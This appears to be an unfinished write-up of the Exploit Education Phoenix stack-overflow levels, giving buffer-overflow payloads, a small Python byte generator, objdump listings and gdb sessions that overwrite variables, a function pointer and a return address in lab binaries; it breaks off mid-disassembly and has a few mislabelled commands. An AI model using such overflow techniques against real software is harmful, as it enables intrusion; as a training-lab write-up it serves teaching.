 #WORK IN PROGRESS
 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Challenge 1 - Stack Zero](#challenge-1---stack-zero)
- [Challenge 2 - Stack One](#challenge-2---stack-one)
- [Challenge 3 - Stack Two](#challenge-3---stack-two)
- [Challenge 4 - Stack Three](#challenge-4---stack-three)
- [Challenge 5 - Stack Four](#challenge-5---stack-four)
- [Challenge 6 - Stack Five](#challenge-6---stack-five)
## Introduction

Welcome to my exploit write up on the Pheonix challanges from the website [Exploit Education](https://exploit.education). 

## Challenge 1 - Stack Zero

[Stack Zero Code](https://exploit.education/phoenix/stack-zero/). 

The challenges start easy. All the code does is check if the volatile integer named changeme has been changed after getting user input. It puts the user input into a buffer with a size of 64 bytes. Since the buffer is only 64 bytes and the code does not check to see if the user input is greater than that, all that is needed to exploit the program is to give it an input greater than 64 bytes.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, the 'changeme' variable has been changed!
```

## Challenge 2 - Stack One

[Stack One Code](https://exploit.education/phoenix/stack-one/). 

This challenge is just as easy as the last. Instead of taking in a user input, the program takes a command-line argument then calls strcpy to copy it into the buffer variable. As an added challenge, the volatile integer now must be changed to a specific value in bytes. Like the last challenge, the buffer is a size 64 bytes meaning it can be overflowed if given a command argument this is a size greater than 64 bytes. If you give the program over 64 'A's it will tell you that the change me variable is not the correct value and what the given value is. The value of changeme is 4 A's in hexcode form.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x41414141, we want 0x496c5962
```
Since we now know what the program wants the changeme variable to be. We just need to add that to the end of 64 bytes of A. We need to translate the hex code into ascii to know what to added to the end of the A's. Looking at a hex to ascii chart gets us 49 = I, 6c = l, 59 = Y, and 62 = b.

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIlYb
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x62596c49, we want 0x496c5962
```
If you put the new characters at the end of the argument string you will see that the challenge is still not complete. The reason for this is because of endianness the system uses little-endian design which flips in the argument that changes the changeme variable. If you account for endianness then the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbYlI
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```
### OR

A second simpler way to solve the challenge is to create a python script that prints out the bytes we need instead of going through the trouble of translating them to ascii. Still need to follow endianness.

```python
import sys
fill = b'A' * 64
adr = b'\x62\x59\x6c\x49'
sys.stdout.buffer.write(fill+adr)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero $(python3 stack-one.py)
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 3 - Stack Two

[Stack Two Code](https://exploit.education/phoenix/stack-two/). 

For this challenge like the last one, it doesn't use user input. Instead of using a command-line argument too, the program uses an environment variable called, ExploitEducation. It sets a char pointer to where ever the environment variable is set. Then whatever is in the ExploitEducation variable is copied into the variable. buffer, which is a char array with the size of 64 bits. Like the last challenge, the volatile integer must be changed to a specific value in bytes. Since the buffer is a size of 64 bytes like the other challenges, it can be overflowed if given an environment variable that contains a string greater than 64 bytes. To set the environment variable you just put in the command line ExploitEducation = “xxxx” then the program. Like:

```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x41414141, we want 0x0d0a090a
```

If you set the variable over 64 'A's it will tell you that the change me variable is not the correct value and what the given value should be. Unlike the last challenge, the hex code can not be converted to ascii. To set the variable to the right hex code all you need to do is add “\x{hexcode}”. Since the program wants 0x0d0a09 you just need to add \x0a\x09\x0a\x0d, which accounts for endianness, to the end of 64 other characters. That is it, the challenge is solved.

### Solved
```bash
user@phoenix-amd64:~$ ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x0a\x09\x0a\x0d /opt/phoenix/amd64/stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Challenge 4 - Stack Three

[Stack Three Code](https://exploit.education/phoenix/stack-three/). 

This program like the first gets user input and places it into a buffer variable with a size of 64 bytes. What is different for this program is the volatile integer is a function pointer. So when you overwrite the fp variable then call the function it contains. It will call whatever function with the hex you overwrote the variable with. Which can be any function you want in the program. If you use the objdump program it can tell you all the hexcode for every function in the program. The function we want to call is complete_level.

```bash
user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-three 

/opt/phoenix/amd64/stack-three:     file format elf64-x86-64


Disassembly of section .init:

00000000004004b0 <_init>:
  4004b0:       50                      push   %rax
  4004b1:       e8 ba 01 00 00          callq  400670 <frame_dummy>
  4004b6:       e8 85 02 00 00          callq  400740 <__do_global_ctors_aux>
  4004bb:       58                      pop    %rax
  4004bc:       c3                      retq   

Disassembly of section .plt:

00000000004004c0 <.plt>:
  4004c0:       ff 35 0a 06 20 00       pushq  0x20060a(%rip)        # 600ad0 <_GLOBAL_OFFSET_TABLE_+0x8>
  4004c6:       ff 25 0c 06 20 00       jmpq   *0x20060c(%rip)        # 600ad8 <_GLOBAL_OFFSET_TABLE_+0x10>
  4004cc:       0f 1f 40 00             nopl   0x0(%rax)

00000000004004d0 <printf@plt>:
  4004d0:       ff 25 0a 06 20 00       jmpq   *0x20060a(%rip)        # 600ae0 <printf>
  4004d6:       68 00 00 00 00          pushq  $0x0
  4004db:       e9 e0 ff ff ff          jmpq   4004c0 <.plt>

00000000004004e0 <gets@plt>:
  4004e0:       ff 25 02 06 20 00       jmpq   *0x200602(%rip)        # 600ae8 <gets>
  4004e6:       68 01 00 00 00          pushq  $0x1
  4004eb:       e9 d0 ff ff ff          jmpq   4004c0 <.plt>

00000000004004f0 <puts@plt>:
  4004f0:       ff 25 fa 05 20 00       jmpq   *0x2005fa(%rip)        # 600af0 <puts>
  4004f6:       68 02 00 00 00          pushq  $0x2
  4004fb:       e9 c0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400500 <fflush@plt>:
  400500:       ff 25 f2 05 20 00       jmpq   *0x2005f2(%rip)        # 600af8 <fflush>
  400506:       68 03 00 00 00          pushq  $0x3
  40050b:       e9 b0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400510 <exit@plt>:
  400510:       ff 25 ea 05 20 00       jmpq   *0x2005ea(%rip)        # 600b00 <exit>
  400516:       68 04 00 00 00          pushq  $0x4
  40051b:       e9 a0 ff ff ff          jmpq   4004c0 <.plt>

0000000000400520 <__libc_start_main@plt>:
  400520:       ff 25 e2 05 20 00       jmpq   *0x2005e2(%rip)        # 600b08 <__libc_start_main>
  400526:       68 05 00 00 00          pushq  $0x5
  40052b:       e9 90 ff ff ff          jmpq   4004c0 <.plt>

Disassembly of section .text:

0000000000400530 <_start>:
  400530:       48 31 ed                xor    %rbp,%rbp
  400533:       48 89 e7                mov    %rsp,%rdi
  400536:       48 8d 35 1b 04 20 00    lea    0x20041b(%rip),%rsi        # 600958 <_DYNAMIC>
  40053d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  400541:       e8 00 00 00 00          callq  400546 <_start_c>

0000000000400546 <_start_c>:
  400546:       48 83 ec 08             sub    $0x8,%rsp
  40054a:       48 8b 37                mov    (%rdi),%rsi
  40054d:       48 8d 57 08             lea    0x8(%rdi),%rdx
  400551:       45 31 c9                xor    %r9d,%r9d
  400554:       41 b8 82 07 40 00       mov    $0x400782,%r8d
  40055a:       b9 b0 04 40 00          mov    $0x4004b0,%ecx
  40055f:       bf b5 06 40 00          mov    $0x4006b5,%edi
  400564:       e8 b7 ff ff ff          callq  400520 <__libc_start_main@plt>
  400569:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

0000000000400570 <deregister_tm_clones>:
  400570:       55                      push   %rbp
  400571:       b8 18 0b 60 00          mov    $0x600b18,%eax
  400576:       48 3d 18 0b 60 00       cmp    $0x600b18,%rax
  40057c:       48 89 e5                mov    %rsp,%rbp
  40057f:       74 17                   je     400598 <deregister_tm_clones+0x28>
  400581:       b8 00 00 00 00          mov    $0x0,%eax
  400586:       48 85 c0                test   %rax,%rax
  400589:       74 0d                   je     400598 <deregister_tm_clones+0x28>
  40058b:       5d                      pop    %rbp
  40058c:       bf 18 0b 60 00          mov    $0x600b18,%edi
  400591:       ff e0                   jmpq   *%rax
  400593:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400598:       5d                      pop    %rbp
  400599:       c3                      retq   
  40059a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000004005a0 <register_tm_clones>:
  4005a0:       be 18 0b 60 00          mov    $0x600b18,%esi
  4005a5:       55                      push   %rbp
  4005a6:       48 81 ee 18 0b 60 00    sub    $0x600b18,%rsi
  4005ad:       48 89 e5                mov    %rsp,%rbp
  4005b0:       48 c1 fe 03             sar    $0x3,%rsi
  4005b4:       48 89 f0                mov    %rsi,%rax
  4005b7:       48 c1 e8 3f             shr    $0x3f,%rax
  4005bb:       48 01 c6                add    %rax,%rsi
  4005be:       48 d1 fe                sar    %rsi
  4005c1:       74 15                   je     4005d8 <register_tm_clones+0x38>
  4005c3:       b8 00 00 00 00          mov    $0x0,%eax
  4005c8:       48 85 c0                test   %rax,%rax
  4005cb:       74 0b                   je     4005d8 <register_tm_clones+0x38>
  4005cd:       5d                      pop    %rbp
  4005ce:       bf 18 0b 60 00          mov    $0x600b18,%edi
  4005d3:       ff e0                   jmpq   *%rax
  4005d5:       0f 1f 00                nopl   (%rax)
  4005d8:       5d                      pop    %rbp
  4005d9:       c3                      retq   
  4005da:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

00000000004005e0 <__do_global_dtors_aux>:
  4005e0:       80 3d 59 05 20 00 00    cmpb   $0x0,0x200559(%rip)        # 600b40 <completed.5577>
  4005e7:       75 77                   jne    400660 <__do_global_dtors_aux+0x80>
  4005e9:       55                      push   %rbp
  4005ea:       48 8b 05 57 05 20 00    mov    0x200557(%rip),%rax        # 600b48 <dtor_idx.5579>
  4005f1:       48 89 e5                mov    %rsp,%rbp
  4005f4:       41 54                   push   %r12
  4005f6:       53                      push   %rbx
  4005f7:       bb 50 09 60 00          mov    $0x600950,%ebx
  4005fc:       41 bc 48 09 60 00       mov    $0x600948,%r12d
  400602:       48 81 eb 48 09 60 00    sub    $0x600948,%rbx
  400609:       48 c1 fb 03             sar    $0x3,%rbx
  40060d:       48 83 eb 01             sub    $0x1,%rbx
  400611:       48 39 d8                cmp    %rbx,%rax
  400614:       73 25                   jae    40063b <__do_global_dtors_aux+0x5b>
  400616:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40061d:       00 00 00 
  400620:       48 83 c0 01             add    $0x1,%rax
  400624:       48 89 05 1d 05 20 00    mov    %rax,0x20051d(%rip)        # 600b48 <dtor_idx.5579>
  40062b:       41 ff 14 c4             callq  *(%r12,%rax,8)
  40062f:       48 8b 05 12 05 20 00    mov    0x200512(%rip),%rax        # 600b48 <dtor_idx.5579>
  400636:       48 39 d8                cmp    %rbx,%rax
  400639:       72 e5                   jb     400620 <__do_global_dtors_aux+0x40>
  40063b:       e8 30 ff ff ff          callq  400570 <deregister_tm_clones>
  400640:       b8 00 00 00 00          mov    $0x0,%eax
  400645:       48 85 c0                test   %rax,%rax
  400648:       74 0a                   je     400654 <__do_global_dtors_aux+0x74>
  40064a:       bf f0 08 40 00          mov    $0x4008f0,%edi
  40064f:       e8 ac f9 bf ff          callq  0 <_init-0x4004b0>
  400654:       5b                      pop    %rbx
  400655:       c6 05 e4 04 20 00 01    movb   $0x1,0x2004e4(%rip)        # 600b40 <completed.5577>
  40065c:       41 5c                   pop    %r12
  40065e:       5d                      pop    %rbp
  40065f:       c3                      retq   
  400660:       f3 c3                   repz retq 
  400662:       0f 1f 40 00             nopl   0x0(%rax)
  400666:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40066d:       00 00 00 

0000000000400670 <frame_dummy>:
  400670:       b8 00 00 00 00          mov    $0x0,%eax
  400675:       48 85 c0                test   %rax,%rax
  400678:       74 1e                   je     400698 <frame_dummy+0x28>
  40067a:       55                      push   %rbp
  40067b:       be 60 0b 60 00          mov    $0x600b60,%esi
  400680:       bf f0 08 40 00          mov    $0x4008f0,%edi
  400685:       48 89 e5                mov    %rsp,%rbp
  400688:       e8 73 f9 bf ff          callq  0 <_init-0x4004b0>
  40068d:       5d                      pop    %rbp
  40068e:       e9 0d ff ff ff          jmpq   4005a0 <register_tm_clones>
  400693:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400698:       e9 03 ff ff ff          jmpq   4005a0 <register_tm_clones>

000000000040069d <complete_level>:
  40069d:       55                      push   %rbp
  40069e:       48 89 e5                mov    %rsp,%rbp
  4006a1:       bf 90 07 40 00          mov    $0x400790,%edi
  4006a6:       e8 45 fe ff ff          callq  4004f0 <puts@plt>
  4006ab:       bf 00 00 00 00          mov    $0x0,%edi
  4006b0:       e8 5b fe ff ff          callq  400510 <exit@plt>

00000000004006b5 <main>:
  4006b5:       55                      push   %rbp
  4006b6:       48 89 e5                mov    %rsp,%rbp
  4006b9:       48 83 ec 60             sub    $0x60,%rsp
  4006bd:       89 7d ac                mov    %edi,-0x54(%rbp)
  4006c0:       48 89 75 a0             mov    %rsi,-0x60(%rbp)
  4006c4:       bf d8 07 40 00          mov    $0x4007d8,%edi
  4006c9:       e8 22 fe ff ff          callq  4004f0 <puts@plt>
  4006ce:       48 c7 45 f0 00 00 00    movq   $0x0,-0x10(%rbp)
  4006d5:       00 
  4006d6:       48 8d 45 b0             lea    -0x50(%rbp),%rax
  4006da:       48 89 c7                mov    %rax,%rdi
  4006dd:       e8 fe fd ff ff          callq  4004e0 <gets@plt>
  4006e2:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4006e6:       48 85 c0                test   %rax,%rax
  4006e9:       74 32                   je     40071d <main+0x68>
  4006eb:       48 8b 45 f0             mov    -0x10(%rbp),%rax
  4006ef:       48 89 c6                mov    %rax,%rsi
  4006f2:       bf 28 08 40 00          mov    $0x400828,%edi
  4006f7:       b8 00 00 00 00          mov    $0x0,%eax
  4006fc:       e8 cf fd ff ff          callq  4004d0 <printf@plt>
  400701:       48 8b 05 18 04 20 00    mov    0x200418(%rip),%rax        # 600b20 <stdout>
  400708:       48 89 c7                mov    %rax,%rdi
  40070b:       e8 f0 fd ff ff          callq  400500 <fflush@plt>
  400710:       48 8b 55 f0             mov    -0x10(%rbp),%rdx
  400714:       b8 00 00 00 00          mov    $0x0,%eax
  400719:       ff d2                   callq  *%rdx
  40071b:       eb 0a                   jmp    400727 <main+0x72>
  40071d:       bf 48 08 40 00          mov    $0x400848,%edi
  400722:       e8 c9 fd ff ff          callq  4004f0 <puts@plt>
  400727:       bf 00 00 00 00          mov    $0x0,%edi
  40072c:       e8 df fd ff ff          callq  400510 <exit@plt>
  400731:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  400738:       00 00 00 
  40073b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)

0000000000400740 <__do_global_ctors_aux>:
  400740:       48 8b 05 f1 01 20 00    mov    0x2001f1(%rip),%rax        # 600938 <__CTOR_LIST__>
  400747:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  40074b:       74 33                   je     400780 <__do_global_ctors_aux+0x40>
  40074d:       55                      push   %rbp
  40074e:       48 89 e5                mov    %rsp,%rbp
  400751:       53                      push   %rbx
  400752:       bb 38 09 60 00          mov    $0x600938,%ebx
  400757:       48 83 ec 08             sub    $0x8,%rsp
  40075b:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400760:       48 83 eb 08             sub    $0x8,%rbx
  400764:       ff d0                   callq  *%rax
  400766:       48 8b 03                mov    (%rbx),%rax
  400769:       48 83 f8 ff             cmp    $0xffffffffffffffff,%rax
  40076d:       75 f1                   jne    400760 <__do_global_ctors_aux+0x20>
  40076f:       48 83 c4 08             add    $0x8,%rsp
  400773:       5b                      pop    %rbx
  400774:       5d                      pop    %rbp
  400775:       c3                      retq   
  400776:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40077d:       00 00 00 
  400780:       f3 c3                   repz retq 

Disassembly of section .fini:

0000000000400782 <_fini>:
  400782:       50                      push   %rax
  400783:       e8 58 fe ff ff          callq  4005e0 <__do_global_dtors_aux>
  400788:       58                      pop    %rax
  400789:       c3                      retq   
```
 
 As you can see when using objdump you get the hex 0x40069d for the location of the complete_level function. The best way of inputing the user input for the program is to pipe it in using python. Calling python with the -c flag makes it run whatever code is in "". So you can print a string then pipe to the program with the | command. To solve the program all you need to do is append the hex code \x9d\x06\x40, accounting for endianness, at the end of 64 charaters of junk. 
 
```bash
 user@phoenix-amd64:~$ python -c "print('A' * 64 + '\x9d\x06\x40')" | /opt/phoenix/amd64/stack-three  
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```
 

## Challenge 5 - Stack Four

[Stack Four Code](https://exploit.education/phoenix/stack-four/). 
 
This challange is the exact same as the last challenge. Expect instead of overwritting a function pointer we have to overwrite a return function. The concept is the same it just requires a little more work. To figure this challenge out we will need to debug the program using gdb. Using gdb we will disassemble the function start_level and place a breakpoint at ret. Then we will run the program and input a string containing the alphabet.

```bash
(gdb) disas start_level
Dump of assembler code for function start_level:
   0x0000000000400635 <+0>:     push   rbp
   0x0000000000400636 <+1>:     mov    rbp,rsp
   0x0000000000400639 <+4>:     sub    rsp,0x50
   0x000000000040063d <+8>:     lea    rax,[rbp-0x50]
   0x0000000000400641 <+12>:    mov    rdi,rax
   0x0000000000400644 <+15>:    call   0x400470 <gets@plt>
   0x0000000000400649 <+20>:    mov    rax,QWORD PTR [rbp+0x8]
   0x000000000040064d <+24>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000400651 <+28>:    mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000400655 <+32>:    mov    rsi,rax
   0x0000000000400658 <+35>:    mov    edi,0x400733
   0x000000000040065d <+40>:    mov    eax,0x0
   0x0000000000400662 <+45>:    call   0x400460 <printf@plt>
   0x0000000000400667 <+50>:    nop
   0x0000000000400668 <+51>:    leave  
   0x0000000000400669 <+52>:    ret    
End of assembler dump.
(gdb) break *0x4006679
Breakpoint 1 at 0x400669
(gdb) r 
Starting program: /opt/phoenix/amd64/stack-four 
Welcome to phoenix/stack-four, brought to you by https://exploit.education
AAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
(gdb) x/s $rip
0x400669 <start_level+52>:      "\303UH\211\345H\203\354\020\211}\374H\211u\360\277P\a@"
Python Exception <class 'UnicodeEncodeError'> 'ascii' codec can't encode character '\u27a4' in position 12: ordinal not in range(128): 
(gdb) si
0x5858585757575756 in ?? ()
(gdb) x/s $rip
0x5858585757575756:     <error: Cannot access memory at address 0x5858585757575756>
 ```
 
 If we check the program pointer at the breakpoint it will point to the return function location still. If we then take one step and check the program pounter again it will be pointing to XXXWWWWV. So we can see that we have overwrite the loction the return function was pointing too. We also know where on the string it is being overwritten. The next thing we need to do is get the function's hexcode we want to jump to and place it on the string.  
 
```bash
 user@phoenix-amd64:~$ objdump -d /opt/phoenix/amd64/stack-four  

/opt/phoenix/amd64/stack-four:     file format elf64-x86-64


Disassembly of section .init:

0000000000400438 <_init>:
  400438:       50                      push   %rax
  400439:       e8 b2 01 00 00          callq  4005f0 <frame_dummy>
  40043e:       e8 5d 02 00 00          callq  4006a0 <__do_global_ctors_aux>
  400443:       58                      pop    %rax
  400444:       c3                      retq   

Disassembly of section .plt:

0000000000400450 <.plt>:
  400450:       ff 35 82 05 20 00       pushq  0x200582(%rip)        # 6009d8 <_GLOBAL_OFFSET_TABLE_+0x8>
  400456:       ff 25 84 05 20 00       jmpq   *0x200584(%rip)        # 6009e0 <_GLOBAL_OFFSET_TABLE_+0x10>
  40045c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400460 <printf@plt>:
  400460:       ff 25 82 05 20 00       jmpq   *0x200582(%rip)        # 6009e8 <printf>
  400466:       68 00 00 00 00          pushq  $0x0
  40046b:       e9 e0 ff ff ff          jmpq   400450 <.plt>

0000000000400470 <gets@plt>:
  400470:       ff 25 7a 05 20 00       jmpq   *0x20057a(%rip)        # 6009f0 <gets>
  400476:       68 01 00 00 00          pushq  $0x1
  40047b:       e9 d0 ff ff ff          jmpq   400450 <.plt>

0000000000400480 <puts@plt>:
  400480:       ff 25 72 05 20 00       jmpq   *0x200572(%rip)        # 6009f8 <puts>
  400486:       68 02 00 00 00          pushq  $0x2
  40048b:       e9 c0 ff ff ff          jmpq   400450 <.plt>

0000000000400490 <exit@plt>:
  400490:       ff 25 6a 05 20 00       jmpq   *0x20056a(%rip)        # 600a00 <exit>
  400496:       68 03 00 00 00          pushq  $0x3
  40049b:       e9 b0 ff ff ff          jmpq   400450 <.plt>

00000000004004a0 <__libc_start_main@plt>:
  4004a0:       ff 25 62 05 20 00       jmpq   *0x200562(%rip)        # 600a08 <__libc_start_main>
  4004a6:       68 04 00 00 00          pushq  $0x4
  4004ab:       e9 a0 ff ff ff          jmpq   400450 <.plt>

Disassembly of section .text:

00000000004004b0 <_start>:
  4004b0:       48 31 ed                xor    %rbp,%rbp
  4004b3:       48 89 e7                mov    %rsp,%rdi
  4004b6:       48 8d 35 d3 03 20 00    lea    0x2003d3(%rip),%rsi        # 600890 <_DYNAMIC>
  4004bd:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  4004c1:       e8 00 00 00 00          callq  4004c6 <_start_c>

00000000004004c6 <_start_c>:
  4004c6:       48 83 ec 08             sub    $0x8,%rsp
  4004ca:       48 8b 37                mov    (%rdi),%rsi
  4004cd:       48 8d 57 08             lea    0x8(%rdi),%rdx
  4004d1:       45 31 c9                xor    %r9d,%r9d
  4004d4:       41 b8 e2 06 40 00       mov    $0x4006e2,%r8d
  4004da:       b9 38 04 40 00          mov    $0x400438,%ecx
  4004df:       bf 6a 06 40 00          mov    $0x40066a,%edi
  4004e4:       e8 b7 ff ff ff          callq  4004a0 <__libc_start_main@plt>
  4004e9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)

00000000004004f0 <deregister_tm_clones>:
  4004f0:       55                      push   %rbp
  4004f1:       b8 18 0a 60 00          mov    $0x600a18,%eax
  4004f6:       48 3d 18 0a 60 00       cmp    $0x600a18,%rax
  4004fc:       48 89 e5                mov    %rsp,%rbp
  4004ff:       74 17                   je     400518 <deregister_tm_clones+0x28>
  400501:       b8 00 00 00 00          mov    $0x0,%eax
  400506:       48 85 c0                test   %rax,%rax
  400509:       74 0d                   je     400518 <deregister_tm_clones+0x28>
  40050b:       5d                      pop    %rbp
  40050c:       bf 18 0a 60 00          mov    $0x600a18,%edi
  400511:       ff e0                   jmpq   *%rax
  400513:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400518:       5d                      pop    %rbp
  400519:       c3                      retq   
  40051a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000400520 <register_tm_clones>:
  400520:       be 18 0a 60 00          mov    $0x600a18,%esi
  400525:       55                      push   %rbp
  400526:       48 81 ee 18 0a 60 00    sub    $0x600a18,%rsi
  40052d:       48 89 e5                mov    %rsp,%rbp
  400530:       48 c1 fe 03             sar    $0x3,%rsi
  400534:       48 89 f0                mov    %rsi,%rax
  400537:       48 c1 e8 3f             shr    $0x3f,%rax
  40053b:       48 01 c6                add    %rax,%rsi
  40053e:       48 d1 fe                sar    %rsi
  400541:       74 15                   je     400558 <register_tm_clones+0x38>
  400543:       b8 00 00 00 00          mov    $0x0,%eax
  400548:       48 85 c0                test   %rax,%rax
  40054b:       74 0b                   je     400558 <register_tm_clones+0x38>
  40054d:       5d                      pop    %rbp
  40054e:       bf 18 0a 60 00          mov    $0x600a18,%edi
  400553:       ff e0                   jmpq   *%rax
  400555:       0f 1f 00                nopl   (%rax)
  400558:       5d                      pop    %rbp
  400559:       c3                      retq   
  40055a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)

0000000000400560 <__do_global_dtors_aux>:
  400560:       80 3d b9 04 20 00 00    cmpb   $0x0,0x2004b9(%rip)        # 600a20 <completed.5577>
  400567:       75 77                   jne    4005e0 <__do_global_dtors_aux+0x80>
  400569:       55                      push   %rbp
  40056a:       48 8b 05 b7 04 20 00    mov    0x2004b7(%rip),%rax        # 600a28 <dtor_idx.5579>
  400571:       48 89 e5                mov    %rsp,%rbp
  400574:       41 54                   push   %r12
  400576:       53                      push   %rbx
  400577:       bb 88 08 60 00          mov    $0x600888,%ebx
  40057c:       41 bc 80 08 60 00       mov    $0x600880,%r12d
  400582:       48 81 eb 80 08 60 00    sub    $0x600880,%rbx
  400589:       48 c1 fb 03             sar    $0x3,%rbx
  40058d:       48 83 eb 01             sub    $0x1,%rbx
  400591:       48 39 d8                cmp    %rbx,%rax
  400594:       73 25                   jae    4005bb <__do_global_dtors_aux+0x5b>
  400596:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  40059d:       00 00 00 
  4005a0:       48 83 c0 01             add    $0x1,%rax
  4005a4:       48 89 05 7d 04 20 00    mov    %rax,0x20047d(%rip)        # 600a28 <dtor_idx.5579>
  4005ab:       41 ff 14 c4             callq  *(%r12,%rax,8)
  4005af:       48 8b 05 72 04 20 00    mov    0x200472(%rip),%rax        # 600a28 <dtor_idx.5579>
  4005b6:       48 39 d8                cmp    %rbx,%rax
  4005b9:       72 e5                   jb     4005a0 <__do_global_dtors_aux+0x40>
  4005bb:       e8 30 ff ff ff          callq  4004f0 <deregister_tm_clones>
  4005c0:       b8 00 00 00 00          mov    $0x0,%eax
  4005c5:       48 85 c0                test   %rax,%rax
  4005c8:       74 0a                   je     4005d4 <__do_global_dtors_aux+0x74>
  4005ca:       bf 08 08 40 00          mov    $0x400808,%edi
  4005cf:       e8 2c fa bf ff          callq  0 <_init-0x400438>
  4005d4:       5b                      pop    %rbx
  4005d5:       c6 05 44 04 20 00 01    movb   $0x1,0x200444(%rip)        # 600a20 <completed.5577>
  4005dc:       41 5c                   pop    %r12
  4005de:       5d                      pop    %rbp
  4005df:       c3                      retq   
  4005e0:       f3 c3                   repz retq 
  4005e2:       0f 1f 40 00             nopl   0x0(%rax)
  4005e6:       66 2e 0f 1f 84 00 00    nopw   %cs:0x0(%rax,%rax,1)
  4005ed:       00 00 00 

00000000004005f0 <frame_dummy>:
  4005f0:       b8 00 00 00 00          mov    $0x0,%eax
  4005f5:       48 85 c0                test   %rax,%rax
  4005f8:       74 1e                   je     400618 <frame_dummy+0x28>
  4005fa:       55                      push   %rbp
  4005fb:       be 40 0a 60 00          mov    $0x600a40,%esi
  400600:       bf 08 08 40 00          mov    $0x400808,%edi
  400605:       48 89 e5                mov    %rsp,%rbp
  400608:       e8 f3 f9 bf ff          callq  0 <_init-0x400438>
  40060d:       5d                      pop    %rbp
  40060e:       e9 0d ff ff ff          jmpq   400520 <register_tm_clones>
  400613:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
  400618:       e9 03 ff ff ff          jmpq   400520 <register_tm_clones>

000000000040061d <complete_level>:
  40061d:       55                      push   %rbp
  40061e:       48 89 e5                mov    %rsp,%rbp
  400621:       bf f0 06 40 00          mov    $0x4006f0,%edi
  400626:       e8 55 fe ff ff          callq  400480 <puts@plt>
  40062b:       bf 00 00 00 00          mov    $0x0,%edi
  400630:       e8 5b fe ff ff          callq  400490 <exit@plt>

0000000000400635 <start_level>:
  400635:       55                      push   %rbp
  400636:       48 89 e5                mov    %rsp,%rbp
  400639:       48 83 ec 50             sub    $0x50,%rsp
  40063d:       48 8d 45 b0             lea    -0x50(%rbp),%rax
  400641:       48 89 c7                mov    %rax,%rdi
  400644:       e8 27 fe ff ff          callq  400470 <gets@plt>
  400649:       48 8b 45 08             mov    0x8(%rbp),%rax
  40064d:       48 89 45 f8             mov    %rax,-0x8(%rbp)
  400651:       48 8b 45 f8             mov    -0x8(%rbp),%rax
  400655:       48 89 c6                mov    %rax,%rsi
  400658:       bf 33 07 40 00          mov    $0x400733,%edi
  40065d:       b8 00 00 00 00          mov    $0x0,%eax
  400662:       e8 f9 fd ff ff          callq  400460 <printf@plt>
  400667:       90                      nop
  400668:       c9                      leaveq 
  400669:       c3                      retq   

000000000040066a <main>:
  40066a:       55                      push   %rbp
  40066b:       48 89 e5                mov    %rsp,%rbp
  40066e:       48 83 ec 10             sub    $0x10,%rsp
